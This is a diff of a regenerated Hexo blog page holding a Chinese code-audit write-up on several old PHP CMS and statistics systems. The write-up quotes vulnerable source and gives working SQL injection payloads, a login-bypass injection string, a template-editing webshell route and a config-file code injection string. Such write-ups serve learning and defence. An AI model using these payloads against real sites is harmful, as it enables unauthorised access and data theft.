@@ -15,10 +15,10 @@
 
 
 <html class="theme-next pisces use-motion" lang="zh-CN">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 
 
@@ -32,8 +32,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -56,9 +56,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.2">
@@ -132,10 +132,12 @@
 
 
 
+  <link rel="alternate" href="/atom.xml" title="Noel's Blog" type="application/atom+xml">
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/03/代码审计一周总结-1/"/>
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/03/代码审计一周总结-1/">
 
 
 
@@ -231,7 +233,7 @@
           
           <li class="menu-item menu-item-home">
     <a href="/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
   </li>
         
         
@@ -239,7 +241,7 @@
           
           <li class="menu-item menu-item-tags">
     <a href="/tags/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
   </li>
         
         
@@ -247,7 +249,7 @@
           
           <li class="menu-item menu-item-categories">
     <a href="/categories/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
   </li>
         
         
@@ -255,7 +257,7 @@
           
           <li class="menu-item menu-item-archives">
     <a href="/archives/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
   </li>
 
       
@@ -381,11 +383,10 @@
 
           
             <span class="post-meta-divider">|</span>
-            <span class="post-meta-item-icon"
-            >
+            <span class="post-meta-item-icon">
             <i class="fa fa-eye"></i>
              阅读次数： 
-            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
             </span>
           
 
@@ -417,16 +418,16 @@
 <h4 id="1-注入"><a href="#1-注入" class="headerlink" title="1.注入"></a>1.注入</h4><p>id不需要闭合单引号，可直接进行注入</p>
 <p>构造payload</p>
 <p><code>http://localhost:8080/Tun2/Admin/Admin_Notice.php?Action=edit&amp;id=1 union select 1,database(),user(),1 limit 1,1</code></p>
-<p><img src="/2018/11/03/代码审计一周总结-1/01.png" alt=""></p>
+<p><img src="/2018/11/03/代码审计一周总结-1/01.png" alt></p>
 <h4 id="2-直接数据库查询"><a href="#2-直接数据库查询" class="headerlink" title="2.直接数据库查询"></a>2.直接数据库查询</h4><p>后台存在数据库管理</p>
-<p><img src="代码审计一周总结-1//02.png" alt=""></p>
+<p><img src="代码审计一周总结-1//02.png" alt></p>
 <p>可以直接进行查询</p>
 <h4 id="3-任意文件读写GETSHELL"><a href="#3-任意文件读写GETSHELL" class="headerlink" title="3.任意文件读写GETSHELL"></a>3.任意文件读写GETSHELL</h4><p>Admin_Templates.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"edit"</span> :</span><br><span class="line">				<span class="keyword">if</span> ( !( $fp = fopen( $_GET[<span class="string">'editfile'</span>], <span class="string">"rb"</span> ) ) )</span><br><span class="line">				&#123;</span><br><span class="line">								<span class="keyword">exit</span>( <span class="string">"不能打开文件"</span>.$_GET[<span class="string">'editfile'</span>] );</span><br><span class="line">				&#125;</span><br><span class="line">				$data = fread( $fp, filesize( $_GET[<span class="string">'editfile'</span>] ) );</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;script language=\"javascript\" src=\"inc/js.js\"&gt;&lt;/script&gt;\r\n&lt;table width=\"98%\" border=\"1\" align=\"center\" cellpadding=\"5\" cellspacing=\"0\" class=\"table\"&gt;\r\n  &lt;form action=\"Admin_Templates.php?Action=editsever\" method=\"post\" onSubmit=\"return Validator.Validate(this,3)\"&gt;\r\n    &lt;tr&gt;\r\n      &lt;td width=\"15%\" align=\"right\"&gt;文件名称：&lt;/td&gt;\r\n      &lt;td&gt;&lt;input name=\"filename\" type=\"text\" value=\""</span>;</span><br><span class="line">				<span class="keyword">echo</span> $_GET[<span class="string">'file'</span>];</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"\" size=\"40\" readonly&gt;&lt;/td&gt;\r\n    &lt;/tr&gt;\r\n    &lt;tr&gt;\r\n      &lt;td colspan=\"2\" align=\"right\"&gt;&lt;textarea name=\"htmlcontent\" style=\"width:100%\" rows=\"30\" dataType=\"Require\" msg=\"请填写模版内容\"&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> str_replace(<span class="string">"textarea&gt;"</span>, <span class="string">"textarea＞"</span>, $data);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/textarea&gt;&lt;/td&gt;\r\n    &lt;/tr&gt;\r\n    &lt;tr&gt;\r\n      &lt;td colspan=\"2\" align=\"center\"&gt;&lt;input name=\"file\" type=\"hidden\" value=\""</span>;</span><br><span class="line">				<span class="keyword">echo</span> $_GET[<span class="string">'editfile'</span>];</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"\"&gt;&lt;input type=\"submit\" name=\"Submit_add\" value=\"修改模板\" /&gt;&lt;/td&gt;\r\n    &lt;/tr&gt;\r\n  &lt;/form&gt;\r\n&lt;/table&gt;\r\n\t"</span>;</span><br><span class="line">				fclose( $fp );</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">"editsever"</span> :</span><br><span class="line">				wfile( $_POST[<span class="string">'file'</span>], stripcslashes( str_replace(<span class="string">"textarea＞"</span>, <span class="string">"textarea&gt;"</span>, $_POST[<span class="string">'htmlcontent'</span>]) ) );</span><br><span class="line">				addlog( <span class="string">"修改模板"</span>.$_POST[<span class="string">'filename'</span>], $_SESSION[<span class="string">'user_name'</span>] );</span><br><span class="line">				admin_showerr( <span class="string">"&lt;li&gt;模板修改成功&lt;/li&gt;"</span>, <span class="string">"Admin_Templates.php"</span>, <span class="number">1</span> );</span><br><span class="line">				<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
 <p>以上两个都可以GETSHELL，这里用editsever进行举例</p>
 <p>构造payload</p>
-<p><img src="代码审计一周总结-1//03.png" alt="">访问shell.php</p>
-<p><img src="代码审计一周总结-1//04.png" alt=""></p>
+<p><img src="代码审计一周总结-1//03.png" alt>访问shell.php</p>
+<p><img src="代码审计一周总结-1//04.png" alt></p>
 <h3 id="2-乘风多用户PHP统计系统-v5-2"><a href="#2-乘风多用户PHP统计系统-v5-2" class="headerlink" title="2.乘风多用户PHP统计系统 v5.2"></a>2.乘风多用户PHP统计系统 v5.2</h3><p>首先看下过滤函数</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkstr</span><span class="params">($paravalue,$paratype)</span> //过滤非法字符</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">if</span>($paratype==<span class="number">1</span>)</span><br><span class="line"> &#123;</span><br><span class="line">  $filterstr=<span class="string">"(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filterstr.<span class="string">"/is"</span>,$paravalue)==<span class="number">1</span>)&#123;   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"传递的参数类型有错误！"</span>;</span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $inputstr=str_replace(<span class="string">"'"</span>,<span class="string">"''"</span>,$paravalue);</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">elseif</span>($paratype==<span class="number">2</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span>($paravalue!=<span class="string">""</span>&amp;&amp;is_numeric($paravalue)==<span class="keyword">false</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"传递的参数类型有错误！"</span>;</span><br><span class="line">     <span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123; </span><br><span class="line">    $inputstr=$paravalue;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span>($paratype==<span class="number">3</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span>($paravalue!=<span class="string">""</span>&amp;&amp;(strtotime($paravalue)==<span class="keyword">false</span>||strtotime($paravalue)==<span class="number">-1</span>))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">echo</span>(<span class="string">"传递的参数类型有错误！"</span>);</span><br><span class="line">     <span class="keyword">exit</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123; </span><br><span class="line">    $inputstr=$paravalue;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> $inputstr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>显然，很难绕过，所以先找下没被过滤的参数</p>
@@ -434,20 +435,20 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"select * from cfstat_search_set where id='$id'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$rs=mysql_fetch_assoc($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>payload</p>
 <p><code>http://localhost/cfstat/adminuser.php?action=searchmodify&amp;id=1%27%20union%20select%201,2,3,user()%20limit%201,1%23</code></p>
-<p><img src="代码审计一周总结-1//05.png" alt=""></p>
+<p><img src="代码审计一周总结-1//05.png" alt></p>
 <p>此外还有一处是注册用户后可进行注册，发生在view.php就不在细说</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$username=$_GET[<span class="string">"username"</span>];</span><br><span class="line">$sql=<span class="string">"select pagename,gbookstate from cfstat_user where username='$username'"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$rs=mysql_fetch_assoc($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h3 id="3-CWCMS-网站管理系统PHP版"><a href="#3-CWCMS-网站管理系统PHP版" class="headerlink" title="3.CWCMS 网站管理系统PHP版"></a>3.CWCMS 网站管理系统PHP版</h3><h4 id="1-全站SQL注入"><a href="#1-全站SQL注入" class="headerlink" title="1.全站SQL注入"></a>1.全站SQL注入</h4><p>未对传入参数进行任何处理，可以随意进行SQL注入</p>
 <p>登录窗口构造payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="string">' union select md5(1),md5(1),md5(1),md5(1)#&amp;pass=1&amp;yzm=32485&amp;act=login</span></span><br></pre></td></tr></table></figure>
 <p>登陆成功</p>
-<p><img src="代码审计一周总结-1//06.png" alt=""></p>
+<p><img src="代码审计一周总结-1//06.png" alt></p>
 <h4 id="2-后台修改设置GETSHELL"><a href="#2-后台修改设置GETSHELL" class="headerlink" title="2.后台修改设置GETSHELL"></a>2.后台修改设置GETSHELL</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$html.=<span class="string">"&lt;?php"</span>.chr(<span class="number">10</span>);</span><br><span class="line">  $html.=chr(<span class="number">36</span>).<span class="string">"cw_name="</span>.chr(<span class="number">34</span>).$_POST[<span class="string">"cw_name"</span>].chr(<span class="number">34</span>).chr(<span class="number">59</span>).chr(<span class="number">10</span>);</span><br><span class="line">  $html.=chr(<span class="number">36</span>).<span class="string">"cw_host="</span>.chr(<span class="number">34</span>).$_POST[<span class="string">"cw_host"</span>].chr(<span class="number">34</span>).chr(<span class="number">59</span>).chr(<span class="number">10</span>);</span><br><span class="line">  $html.=chr(<span class="number">36</span>).<span class="string">"cw_root="</span>.chr(<span class="number">34</span>).$_POST[<span class="string">"cw_root"</span>].chr(<span class="number">34</span>).chr(<span class="number">59</span>).chr(<span class="number">10</span>);</span><br><span class="line">  $html.=chr(<span class="number">36</span>).<span class="string">"cw_upfile="</span>.chr(<span class="number">34</span>).$_POST[<span class="string">"cw_upfile"</span>].chr(<span class="number">34</span>).chr(<span class="number">59</span>).chr(<span class="number">10</span>);</span><br><span class="line">  $html.=chr(<span class="number">36</span>).<span class="string">"index_title="</span>.chr(<span class="number">34</span>).$_POST[<span class="string">"index_title"</span>].chr(<span class="number">34</span>).chr(<span class="number">59</span>).chr(<span class="number">10</span>);</span><br><span class="line">.......</span><br><span class="line">  cw_create(<span class="string">"../inc/"</span>,<span class="string">"config.php"</span>,$html);</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;script&gt;alert('设置修改成功！');location.href='cw_web.php';&lt;/script&gt;"</span>);</span><br></pre></td></tr></table></figure>
 <p>构造payload</p>
 <p><code>cw_name=创文企业网站管理系统&quot;;phpinfo()//</code></p>
-<p><img src="代码审计一周总结-1//07.png" alt=""></p>
+<p><img src="代码审计一周总结-1//07.png" alt></p>
 <h3 id="4-夏日PHP电子商务系统V-02"><a href="#4-夏日PHP电子商务系统V-02" class="headerlink" title="4.夏日PHP电子商务系统V.02"></a>4.夏日PHP电子商务系统V.02</h3><h4 id="1-全站SQL注入-1"><a href="#1-全站SQL注入-1" class="headerlink" title="1.全站SQL注入"></a>1.全站SQL注入</h4><p>并未对输入做过滤，随意找一个注入点进行注入，就不进行分析了</p>
-<p><img src="/2018/11/03/代码审计一周总结-1/08.png" alt=""></p>
+<p><img src="/2018/11/03/代码审计一周总结-1/08.png" alt></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>目前还是比较菜，大多数漏洞只能在后台界面发现，大多数漏洞原因是开发者在某个页面少了过滤。</p>
 <p>待续</p>
 
@@ -565,7 +566,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">37</span>
+                    <span class="site-state-item-count">40</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -604,7 +605,11 @@
                     
                       
                     
-                    <span class="site-state-item-count">13</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
@@ -647,7 +652,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">15</span>
+                      
+                    
+                    <span class="site-state-item-count">16</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -655,6 +662,13 @@
             </nav>
           
 
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
           
 
           
@@ -726,7 +740,7 @@
     <footer id="footer" class="footer">
       <div class="footer-inner">
         <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
@@ -742,7 +756,7 @@
 
   <div class="powered-by"><!--
 <i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>-->
-  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>
+  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.8.0</div>
 
 
 
@@ -754,7 +768,7 @@
 
 
 
-
+</div>
         
 <div class="busuanzi-count">
   <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
@@ -923,5 +937,5 @@
 
   
 
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
